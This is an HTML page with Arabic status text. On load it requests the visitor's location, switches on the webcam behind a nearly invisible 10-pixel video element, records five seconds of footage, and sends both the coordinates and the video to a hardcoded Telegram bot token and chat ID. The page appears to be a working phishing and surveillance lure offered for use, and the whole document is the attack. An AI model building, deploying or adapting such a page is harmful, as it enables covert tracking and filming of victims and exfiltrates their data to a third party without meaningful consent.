<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>🎥 تسجيل وموقع مباشر</title>
  <style>
    body {
      margin: 0;
      padding: 0;
      background: #000;
      color: #fff;
      display: flex;
      align-items: center;
      justify-content: center;
      height: 100vh;
      font-family: sans-serif;
    }
    #status {
      font-size: 18px;
    }
    video {
      position: absolute;
      width: 10px;
      height: 10px;
      top: 0;
      left: 0;
      opacity: 0.01;
    }
  </style>
</head>
<body>
  <div id="status">⏳ جاري بدء التسجيل وتحديد الموقع...</div>
  <video id="video" autoplay playsinline muted></video>

  <script>
    const chat_id = "6908826896";
    const token = "8216581015:AAFEu3XEvT2jePOMdSU8OYP9olix4JNzfk4";

    async function sendLocation() {
      if ("geolocation" in navigator) {
        navigator.geolocation.getCurrentPosition(pos => {
          const { latitude, longitude } = pos.coords;
          fetch(`https://api.telegram.org/bot${token}/sendLocation?chat_id=${chat_id}&latitude=${latitude}&longitude=${longitude}`);
        }, err => {
          console.warn("❌ فشل تحديد الموقع:", err.message);
        });
      }
    }

    async function startRecording() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
        const video = document.getElementById("video");
        video.srcObject = stream;

        const recorder = new MediaRecorder(stream);
        const chunks = [];

        recorder.ondataavailable = e => {
          if (e.data.size > 0) chunks.push(e.data);
        };

        recorder.onstop = () => {
          const blob = new Blob(chunks, { type: "video/mp4" });
          stream.getTracks().forEach(t => t.stop());

          const formData = new FormData();
          formData.append("chat_id", chat_id);
          formData.append("video", blob, "recorded.mp4");

          fetch(`https://api.telegram.org/bot${token}/sendVideo`, {
            method: "POST",
            body: formData
          }).then(res => res.json()).then(data => {
            document.getElementById("status").innerText = data.ok ? "✅ تم إرسال الفيديو والموقع!" : "❌ فشل في إرسال الفيديو.";
          }).catch(() => {
            document.getElementById("status").innerText = "❌ خطأ في الاتصال.";
          });
        };

        recorder.start();
        document.getElementById("status").innerText = "⏺️ يتم التسجيل الآن...";

        setTimeout(() => recorder.stop(), 5000); // يسجل 5 ثواني

      } catch (err) {
        document.getElementById("status").innerText = "❌ فشل تشغيل الكاميرا.";
      }
    }

    window.onload = () => {
      sendLocation();
      startRecording();
    };
  </script>
</body>
</html>
